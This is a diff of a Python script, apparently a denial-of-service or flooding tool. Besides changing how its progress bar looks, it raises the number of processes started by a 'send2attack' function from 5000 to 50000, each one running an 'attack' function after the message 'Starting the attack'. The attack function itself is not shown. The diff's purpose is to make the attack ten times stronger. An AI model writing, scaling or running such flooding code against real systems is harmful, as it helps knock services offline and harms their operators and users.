@@ -11,7 +11,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     count = len(it)
     def show(j):
         x = int(size*j/count)
-        file.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "."*(size-x), j, count))
+        file.write("%s[%s%s] %i/%i\r" % (prefix, "="*x, "*"*(size-x), j, count))
         file.flush()
         file.write("\n")
     show(0)
@@ -23,8 +23,8 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     
 import time
 
-for i in progressbar(range(15), "Computing: ", 40):
-    time.sleep(0.1)
+for i in progressbar(range(15), "Barra Util: ", 50):
+    time.sleep(1.0)
     
     
 print("Detecting System...")
@@ -72,7 +72,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(50000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
